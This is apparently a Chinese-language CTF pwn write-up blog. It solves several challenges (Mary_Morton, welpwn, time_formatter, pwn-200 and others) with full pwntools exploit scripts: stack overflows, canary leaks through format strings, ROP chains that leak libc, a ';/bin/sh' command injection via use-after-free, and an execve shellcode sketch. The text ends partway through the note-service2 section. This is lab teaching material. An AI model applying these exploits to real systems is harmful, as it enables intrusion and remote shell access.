<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091711987.png" alt="image-20201216091711987"></p>
<p>整个for循环控制v14的值。</p>
<p>查看其他函数，发现一个后门函数。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091815706.png" alt="image-20201216091815706"></p>
<h3 id="思路及利用"><a href="#思路及利用" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>显然，目标就是执行后门函数。联想到v2可以溢出，那么第一个想法就是v2能否溢出修改v3的值。查看栈的结构，发现v2是可以溢出修改v3的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092006005.png" alt="image-20201216092006005"></p>
<p>接下来考虑v14的值，如果v14是1，那么就直接执行v3指向的函数，这是最方便的。要使v14为1，就需要不满足下列条件。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092221627.png" alt="image-20201216092221627"></p>
<p>“A”不符合条件。</p>
<p>没有开启pie，那么可以直接通过ida确定shell函数的地址。</p>
<p>最后编写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">42685</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p32(<span class="number">0x80486CC</span>)<span class="comment">#v2与v3距离0x20</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;abcd&#x27;</span>)<span class="comment">#第一次输入无所谓</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093640287.png" alt="image-20201216093640287"></p>
<h2 id="2-Mary-Morton"><a href="#2-Mary-Morton" class="headerlink" title="2.Mary_Morton"></a>2.Mary_Morton</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180854344.png" alt="image-20201220180854344"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093833219.png" alt="image-20201216093833219"></p>
<p>开启了canary。</p>
<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>程序提供了两种漏洞，格式化字符串和栈溢出。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094746428.png" alt="image-20201216094746428"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094805753.png" alt="image-20201216094805753"></p>
<p>同时也发现了后门函数<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094836014.png" alt="image-20201216094836014"></p>
<h3 id="思路及利用-1"><a href="#思路及利用-1" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>既然由栈溢出，那么最直接的思路就是通过栈溢出覆盖返回地址去执行后门函数。但是程序开启了canary，需要绕过。绕过的方法很多，考虑到给了格式化字符串，那么基本方向是利用格式化字符串泄露canary。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095700046.png" alt="image-20201216095700046">可以看出，canary是在ebp的上一个位置。          </p>
<p>那么接下来就是确定偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095859731.png" alt="image-20201216095859731"></p>
<p> (0x7fffffffdde8-0x7fffffffdd60)/8 = 17，由于是64位还有6个寄存器，所以偏移一共是17+6 = 23.</p>
<p>因此exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">52579</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%23$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x88</span> + p64(canary) + p64(<span class="number">0</span>) + p64(shell)<span class="comment">#栈溢出</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216100848549.png" alt="image-20201216100848549"></p>
<h2 id="3-warmup"><a href="#3-warmup" class="headerlink" title="3.warmup"></a>3.warmup</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180909635.png" alt="image-20201220180909635"></p>
<p>这道题没有给附件，那么就是fuzz的题目了。</p>
<p>fuzz，也就是模糊测试。Fuzzing技术是一种基于黑盒（或灰盒）的测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。</p>
<p>首先，先跑一下程序。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202164645530.png" alt="image-20201202164645530"></p>
<p>可以看到给了一个地址。这道题难度系数不大，加上给了一个地址，因此猜测是简单的栈溢出。</p>
<p>编写脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">addr = <span class="number">0x40060d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分三种情况，不用地址，用32位地址，用64位地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">p,num,flag</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*num</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">        payload += p32(addr)</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">2</span>):</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43573</span>)</span><br><span class="line">                fuzz(p,i,j)</span><br><span class="line">                text = p.recv()</span><br><span class="line">                print(<span class="string">&#x27;text.len=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(text))+<span class="string">&#x27;text=&#x27;</span>+text)</span><br><span class="line">                print(<span class="string">&#x27;num=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; flag=&#x27;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">                p.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                p.close()</span><br><span class="line">                sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h2 id="4-welpwn"><a href="#4-welpwn" class="headerlink" title="4.welpwn"></a>4.welpwn</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180923482.png" alt="image-20201220180923482"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220181243613.png" alt="image-20201220181243613"></p>
<h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183006893.png" alt="image-20201220183006893"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183024184.png" alt="image-20201220183024184"></p>
<p>整个程序，逻辑是主函数获取输入，在echo函数中会将输入复制到s2中，再进行输出。主函数的输入范围远大于s2，可以做到栈溢出。</p>
<p>但是需要注意的是，在复制的for循环中，如果为<code>\x00</code>会使得判断语句为0，造成循环中断。</p>
<h3 id="思路及利用-2"><a href="#思路及利用-2" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>程序只开启了堆栈不可执行保护，同时没有调用过system函数，那么只有先泄露地址再进行rop。注意到for循环不能出现<code>\x00</code>，直接借助echo泄露地址的方法就不可行了，由于是小端序，返回地址的位数一致，覆盖返回地址是可行的。</p>
<p>但是，在主函数的输入的数据仍然是在主函数的栈中，因此可以覆盖echo函数的返回地址到主函数栈帧。要返回到主函数的栈帧，要么知道地址，要么用pop之类的语句。显然，获得栈帧地址不现实，那么就寻找pop语句。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220190823145.png" alt="image-20201220190823145"></p>
<p>可以发现，最多能够一次出栈4个，而在echo函数中，覆盖到返回地址也就是需要0x20个字节，也就是说主函数的栈帧与s2在栈上的位置也就相隔0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220191614222.png" alt="image-20201220191614222"></p>
<p>可以看到，s2复制的起始地址与buf相隔0x20.因此使用之前的pop语句之后，就可以跳过覆盖s2的字节，执行泄露代码。</p>
<p>利用puts函数泄露got地址，再返回到start。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop4 = <span class="number">0x40089c</span></span><br><span class="line">poprid = <span class="number">0x4008a3</span></span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x9c\x08\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>泄露地址之后就是常规操作，可以通过LibcSearcher得到system地址，“/bin/sh”地址，依照相同方式，得到shell。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">48838</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pop4 = <span class="number">0x40089c</span></span><br><span class="line">poprid = <span class="number">0x4008a3</span></span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x9c\x08\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">sh = base +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(sh)+p64(system)+p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220194125391.png" alt="image-20201220194125391"></p>
<h2 id="5-monkey"><a href="#5-monkey" class="headerlink" title="5.monkey"></a>5.monkey</h2><p>这次获取的附件比较奇怪</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165328947.png" alt="image-20201202165328947"></p>
<p>用ida打开js文件</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165908347.png" alt="image-20201202165908347"></p>
<p>发现完全看不懂是在干什么。</p>
<p>试着执行以下程序。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202170029431.png" alt="image-20201202170029431"></p>
<p>感觉像是一个shell，这道题触及了我的知识盲区。</p>
<p>网上查找wp，才知道这是个jsshell。利用JavaScript的系统调用就行。</p>
<h2 id="6-time-formatter"><a href="#6-time-formatter" class="headerlink" title="6.time_formatter"></a>6.time_formatter</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165602237.png" alt="image-20201202165602237"></p>
<h3 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h3><p>根据程序功能，将函数重命名。</p>
<p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171240776.png" alt="image-20201202171240776"></p>
<p>在set_time_format函数中，找到比较关键的输入函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171329588.png" alt="image-20201202171329588"></p>
<p>继续往下</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171507426.png" alt="image-20201202171507426"></p>
<p>这里值得注意的是strdup函数。</p>
<blockquote>
<p>定义函数：char * strdup(const char *s);</p>
<p>函数说明：strdup()会先用maolloc()配置与参数s 字符串相同的空间大小，然后将参数s 字符串的内容复制到该内存地址，然后把该地址返回。该地址最后可以利用free()来释放。</p>
</blockquote>
<p>在设置时区的函数中，也发现了也会调用strdup函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171856179.png" alt="image-20201202171856179"></p>
<p>在退出函数中发现，是先free再询问是否退出。这里就有一个UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172023878.png" alt="image-20201202172023878"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172043020.png" alt="image-20201202172043020"></p>
<p>最后在打印函数中看到，command会包含format里的内容。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172125280.png" alt="image-20201202172125280"></p>
<p>也就是说，最终执行的是<code>system(/bin/date -d @unix_time &#39;format&#39;)</code>.因此，只要format里的内容是<code>&#39;;/bin/sh&#39;</code>就可以得到shell。</p>
<p>但是，注意到format输入会有一个检测函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172403191.png" alt="image-20201202172403191"></p>
<p>format只能包含”%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# “里的内容。</p>
<h3 id="思路及利用-3"><a href="#思路及利用-3" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>上面已经知道，需要将<code>&#39;;/bin/sh&#39;</code>写入format，就要绕过检查函数。有一个UAF漏洞可以利用。思路就很清晰了：</p>
<ul>
<li>随便输入一个format。</li>
<li>调用exit函数，但不退出。（这里没有输入时区，free掉一个空指针是可以的）</li>
<li>选择输入时区，这个时候向时区中输入也就是向之前的format输入。输入需要的<code>&#39;;/bin/sh&#39;</code>。</li>
<li>输入一个时间。（打印函数能成功执行）</li>
<li>执行打印函数。</li>
</ul>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;time_formatter&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">57804</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;&#x27;;/bin/sh&#x27;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202173811503.png" alt="image-20201202173811503"></p>
<h2 id="7-pwn-200"><a href="#7-pwn-200" class="headerlink" title="7.pwn-200"></a>7.pwn-200</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204019066.png" alt="image-20201220204019066"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204110640.png" alt="image-20201220204110640"></p>
<h3 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204324635.png" alt="image-20201220204324635"></p>
<p>主要函数很简单，就是一个输入函数。可以看到存在栈溢出漏洞。</p>
<h3 id="思路及利用-4"><a href="#思路及利用-4" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>因为开启了堆栈不可执行，所以shellcode不可行，考虑使用rop的方法。由于没有调用system函数，首先要泄露地址。</p>
<p>整个程序很简单，只需要简单的覆盖返回地址为write函数的plt即可。这里需要注意的是32位的传参方式与64位有所不同。</p>
<p>因此泄露函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">write_got = efl.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = efl.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)<span class="comment">#write(fd，addr,len)需要三个参数</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>泄露地址之后就是常规操作，可以通过LibcSearcher得到system地址，“/bin/sh”地址，依照相同方式，得到shell。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">31442</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn200&#x27;)</span></span><br><span class="line">efl = ELF(<span class="string">&#x27;pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">write_got = efl.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = efl.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220205838214.png" alt="image-20201220205838214"></p>
<h2 id="8-pwn1"><a href="#8-pwn1" class="headerlink" title="8.pwn1"></a>8.pwn1</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210407729.png" alt="image-20201220210407729"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210437478.png" alt="image-20201220210437478"></p>
<h3 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210753716.png" alt="image-20201220210753716"></p>
<p>程序仍然十分简单，漏洞很明确就是栈溢出，堆栈不可执行，没有调用过system函数，基本思路<strong>pwn200</strong>一致，传参为64位又与<strong>welpwn</strong>类似。不过不同的是，保护中开启了canary，所以需要先泄露canary的值。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211118535.png" alt="image-20201220211118535">可以看出canary紧邻ebp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211219859.png" alt="image-20201220211219859"></p>
<p>因此，需要填充的垃圾数据为0x90-0x8 = 0x88。这里利用puts函数的特点，输入0x88个垃圾数据，将canary的值顺带输出。</p>
<p>传递参数需要一个<code>pop rdi ，ret</code><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211732114.png" alt="image-20201220211732114"></p>
<p>整个exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">57170</span>)</span><br><span class="line">prdi_addr=<span class="number">0x0400a93</span></span><br><span class="line">main_addr=<span class="number">0x0400908</span></span><br><span class="line">one_gadget_addr=<span class="number">0x45216</span></span><br><span class="line">put_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(prdi_addr)+p64(put_got)+p64(put_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">put_addr=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(put_addr)</span><br><span class="line">libc_base=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">flag=libc_base+one_gadget_addr</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(flag)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211938141.png" alt="image-20201220211938141"></p>
<h2 id="9-note-service2"><a href="#9-note-service2" class="headerlink" title="9.note-service2"></a>9.note-service2</h2><h3 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h3><p>惯例先checksec一下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223457054.png" alt="image-20201123223457054"></p>
<p>然后使用ida反编译。一边阅读一边修改函数名称，将整个过程走一遍。</p>
<p>其中只实现了add和delete。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223844741.png" alt="image-20201123223844741"></p>
<p>在add函数中，没有对index进行检查，因此可以通过输入index值基本实现将任意指针写到globle数组中。同时申请的chunk大小不能超过8字节，小于64位下chunk的最小值，实际分配的chunk每个用户数据大小是16字节（0x10）还有chunk头16字节。</p>
<p>对于获取输入的函数也有需要注意的地方：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224225947.png" alt="image-20201123224225947"></p>
<p>关于delete函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224310040.png" alt="image-20201123224310040"></p>
<h3 id="思路及利用-5"><a href="#思路及利用-5" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先值得注意的漏洞有两个，一个是数组的越界，一个是释放chunk后没有将指针置为null。但是由于题目限制了对chunk的写入数据大小，没法做到溢出，因此关于堆的攻击技巧基本上都不能用。</p>
<p>目标转为数组越界，同时注意到这道题目是堆栈可执行的。那么就可以考虑，将shellcode写入堆，利用数组越界将堆指针替换为got表项，更改相应函数的执行内容。结合下文出现的参数传递问题，选择free函数是比较合适的。</p>
<p>但是每一个chunk输入最多为7字节，只能将shellcode分散，利用jmp指令跳转。</p>
<p>关于shellcode的编写。选择系统调用execve(“/bin/sh”,0,0)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov rdi, xxx   <span class="comment">//xxx=&amp;(&quot;/bin/sh&quot;)  </span></span><br><span class="line">mov rsi,<span class="number">0</span>   </span><br><span class="line">mov rax, <span class="number">0x3b</span> <span class="comment">//rax=0x3b execve在64位下的系统调用号</span></span><br><span class="line">mov rdx,<span class="number">0</span>   </span><br><span class="line">syscall </span><br></pre></td></tr></table></figure>

<p>但是<code>mov rsi,0</code>太长，因此换为<code>xor rsi, rsi </code>利用异或实现。同理<code>mov rdx,0 </code>也是。</p>
